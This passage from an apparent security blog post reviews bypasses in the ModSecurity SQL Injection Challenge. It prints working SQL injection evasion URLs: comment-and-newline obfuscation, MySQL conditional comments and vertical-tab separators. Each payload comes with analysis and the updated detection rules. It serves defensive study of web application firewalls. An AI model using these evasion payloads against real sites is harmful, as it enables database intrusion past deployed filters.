23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaafv%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201" target="_self">http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-2%20div%201%20union%20all%23yeaah%0A%23yeah...</a></p>
+<pre>http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-
+2%20div%201%20union%20all%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A
+%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23f
+afsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0
+A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%
+0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23f
+afsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0
+A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%
+0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%2
+3fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc
+%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaa
+h%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%2
+3fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc
+%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23ye
+a%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa
+%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20ba
+bc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23ye
+aah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa
+%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20ba
+bc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23
+yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsa
+fa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20
+babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23
+yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsa
+fa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20
+babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%
+23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafd
+safa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%
+20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%
+23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafd
+safa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%
+20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%2
+3%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsa
+fdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yea
+h%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%2
+3%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsa
+fdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yea
+h%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf
+%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fd
+safdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23y
+eah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf
+%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fd
+safdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23y
+eah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsf
+af%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23
+fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%2
+3yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsf
+af%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23
+fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%2
+3yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23faf
+sfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%
+23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A
+%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23faf
+sfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%
+23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A
+%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23f
+afsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0
+A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%
+0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23f
+afsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A%23yeah%20babc%0
+A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%
+0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%2
+3fafsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc
+%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%
+0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0
+A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A
+%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%
+23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%2
+3fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23
+fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23f
+dsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fd
+safdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fds
+afdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsa
+fdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaf%23%0A%23fdsafdsafa%23fafsfaaf%23fafsfaaf%2
+3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%2
+3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%2
+3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%2
+3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%2
+3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%2
+3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%2
+3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaafv%
+23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%
+0Aselect%200x00,%200x41%20like<span style="background-color: #ffff00;"><strong>/*!31337table_name*/</strong></span>,3%20from%20information_schema.tables%
+20limit%201</pre>
+<h4><span style="font-size: 21px; font-weight: bold;">Bypass Analyis</span></h4>
+<p>Roberto's bypass is somewhat similar to Johannes' in that is using the MySQL Comment syntax trick of placing a hash char (#) followed by random text and then a new line char (%0A).  Roberto would have achieved Level II status sooner, however after Johannes' submission, we added the multiMatch action which ended up catching Roberto's evasion method.</p>
+<p>Even with this technique, the following ModSecurity rule was still catching the &quot;table_name&quot; function at the end.</p>
+<pre>SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
+<span style="background-color: #ffff00;"><strong>&quot;(?i:\btable_name\b)&quot;</strong></span> \
+	&quot;phase:2,rev:'2.2.2',capture,multiMatch,t:none,t:urlDecodeUni,t:replaceComments,ctl:auditLogParts=+E,block,msg:'Blind SQL Injection Attack',id:'959914',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',logdata:'%{TX.0}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}&quot;</pre>
+<p>If you look at the regular expression used, however, you can see that we were using non-word boundaries (\b) on both ends of the text in order to help reduce false positives.  </p>
+<p>In this particular attack scenario, when the keyword is placed inside of the SQL Comment to execute a conditional command, it bypassed the regular expression.</p>
+<h4>Bypass #6 - Lessons Learned</h4>
+<p>In order to catch Roberto's evasion methods, we had to do update our SQL Comment detections to detect the &quot;/*!&quot; syntax.</p>
+<h3>Bypass #7 by Sqlmap Developers</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/testphp.vulnweb.com/" target="_self">Acunetix Acuart Site</a></p>
+<h4>Example Bypass Request</h4>
+<p><a href="http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=%40%40new%20union%23sqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsqlmapsql%0Aselect%201,2,database%23sqlmap%0A%28%29" target="_self">http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29 </a></p>
+<h4>Bypass Analyis</h4>
+<p>The Sqlmap Developers evaded the CRS signatures by using the MySQL Comment + New Line trick which seperated out the keywords with random text.  The Sqlmap team has even added a number of variations of this evasion method to the <a href="https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/" target="_self">&quot;tamper scripts&quot;</a> which can be used when running assessments.</p>
+<h4>Bypass #7 - Lessons Learned</h4>
+<p>As good as blacklist regular expression may be, they will eventually fail.  It is important to keep in mind that there are limits that will be reached when attempting to use a lower level language (REGEX) to describe a higher level language (SQL).  There is just no way to be able to capture all of the possible logic in SQL queries using regular expressions.</p>
+<p>With that in mind, we opted to use a more generic approach to detecting some of these advanced evasion techniques.  Rather than trying to properly mimic SQL queries, we instead added the following rule which simply looks for excessive use of meta-characters within the payloads:</p>
+<pre>SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
+&quot;([\~\!\@\#\$\%\^\&amp;\*\(\)\-\+\=\{\}\[\]\|\:\;\&quot;\'\´\'\'\`\&lt;\&gt;].*){4,}&quot; \
+&quot;phase:2,t:none,t:urlDecodeUni,block,id:'981173',rev:'2.2.1',msg:'Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded',capture,logdata:'%{tx.1}',setvar:tx.anomaly_score=+%{tx.warning_anomaly_score},setvar:tx.sql_injection_score=+1,setvar:'tx.msg=%{rule.msg}',setvar:tx.%{rule.id}-WEB_ATTACK/RESTRICTED_SQLI_CHARS-%{matched_var_name}=%{tx.0}&quot;</pre>
+<h3>Bypass #8 by HackPlayers</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/testphp.vulnweb.com/" target="_self">Acunetix Acuart Site</a></p>
+<h4>Example Bypass Request</h4>
+<p><a href="http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-2%20div%201%20union%20all%23hack%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%23%0A%23fabuloso%23great%23%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201" target="_self">http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-2%20div%201%20union%20all%23hack%0A%23hpys%20player%0A%23...%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201</a></p>
+<pre>http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-
+2%20div%201%20union%20all%23hack%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20pl
+ayer%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%
+0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23
+fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabul
+oso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%2
+3modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23mods
+ec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A
+%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hp
+ys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20
+player%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20playe
+r%0A%23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%
+23fabuloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fab
+uloso%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso
+%23great%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23gr
+eat%0A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0
+A%23hpys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23h
+pys%20player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%2
+0player%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20play
+er%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%0A
+%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23fabuloso%23modsec%0A%
+23hpys%20player%0A%23fabuloso%23great%23%0A%23fabuloso%23great%23%0Aselect%200x00%2C%200
+x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limi
+t%201</pre>
+<h4>Bypass Analyis</h4>
+<p>HackPlayers used the same MySQL Comment + random text + New Line evasion technique described previously.</p>
+<h4>Bypass #8 - Lessons Learned</h4>
+<p>Updated rules now catch this bypass technique.</p>
+<h3>Bypass #9 by Georgi Geshev</h3>
+<p>Target Application: <a href="http://www.modsecurity.org/testphp.vulnweb.com/" target="_self">Acunetix Acuart Site</a></p>
+<h4>Example Bypass Request</h4>
+<p><a href="http://www.modsecurity.org/testphp.vulnweb.com/listproducts.php?artist=1%0bAND(SELECT%0b1%20FROM%20mysql.x)" target="_self">http://www.modsecurity.org/testphp.vulnweb.com/listproducts.php?artist=1<span style="background-color: #ffff00;"><strong>%0b</strong></span>AND(SELECT<strong><span style="background-color: #ffff00;">%0b</span></strong>1%20FROM%20mysql.x)</a></p>
+<h4>Bypass Analyis</h4>
+<p>Georgi used the vertical tab character (%0B) instead of a space to separate keywords.  This is valid SQL syntax and there are a number of different <a href="https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk#Allowed_Intermediary_Character_30801873723976314" target="_self">allowed intermediary characters - see Roberto Salgado's SQL Injection Pocket Reference for more information</a>.</p>
+<h4>Bypass #9 - Lessons Learned</h4>
+<p>Blacklist filters must be able to account for various <a href="https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk#Allowed_Intermediary_Character_30801873723976314" target="_self">allowed intermediary characters as outline in Roberto Salgado's excellent SQL Injection Pocket Reference</a>.</p>
+<h4><strong>Allowed Intermediary Characters:</strong></h4>
+<div><ul><li><span style="font-size: small;">09</span></li><li><span style="font-size: small;">0A</span></li><li><span style="font-size: small;">0B</span></li><li><span style="font-size: small;">0C</span></li><li><span style="font-size: small;">0D</span></li><li><span style="font-size: small;">A0</span></li></ul></div>
+<p>Many of the CRS rules were updated to better handle various space-related characters.  The payload is currently caught by the following rule:</p>
+<pre>SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \
+&quot;(?i:(?:,.*[)\da-f(\&quot;|'|`|´|'|')](\&quot;|'|`|´|'|')(?:(\&quot;|'|`|´|'|').*(\&quot;|'|`|´|'|')|\Z|[^(\&quot;|'|`|´|'|')]+))|(?:\Wselect.+\W*from)|((?:select|create|rename|truncate|load|alter|delete|update|insert|desc)\s*\(\s*space\s*\())&quot; \
+&quot;phase:2,capture,multiMatch,t:none,t:urlDecodeUni,t:replaceComments,block,msg:'Detects MySQL comment-/space-obfuscated injections and backtick termination',id:'981257',tag:'WEB_ATTACK/SQLI',tag:'WEB_ATTACK/ID',logdata:'%{TX.0}',severity:'2',setvar:'tx.msg=%{rule.id}-%{rule.msg}',setvar:tx.anomaly_score=+5,setvar:'tx.%{tx.msg}-WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}',setvar:'tx.%{tx.msg}-WEB_ATTACK/ID-%{matched_var_name}=%{tx.0}'<span style="font-family: Georgia; font-size: 14px; white-space: normal;"></span></pre>
+<h3>Final Analysis</h3>
+<h4><span style="font-size: 21px;">Better... but not perfect</span></h4>
+<p>Thanks to the people who participated in the SQLi Challenge, the OWASP ModSecurity Core Rule Set's SQL Injection protections have been significantly improved.  With this being said, we have to realize that relying upon negative security filters, no matter how good we think they are, will only serve as a roadblock for determined attackers.  Blacklist filters should be used as one layer of defense but not as the only one.</p>
+<h4>Blacklist filtering is not enough</h4>
+<p>As evidenced by the successful evasions, using blacklist filtering is not adequate to fully prevent SQL Injection attacks.  You must have a multi-pronged approach to address SQL Injection attacks/vulnerabilities.  <a href="https://www.trustwave.com/application-security.php" target="_self">Trustwave SpiderLabs' 360 Application Security Program can help organizations fix all facets of SQL Injection flaws</a>.</p>
+<p>One of the Sqlmap Developers, Miroslav Stampar has an outstanding blog post entitled &quot;<a href="http://unconciousmind.blogspot.com/2011/07/rules-of-thumb-for-preventing-sql.html" target="_self">Rules of (a) thumb for preventing sql injection(s)</a>&quot;, where he highlights many different aspects of fixing SQL Injection flaws.  He states the following about Blacklist filters:</p>
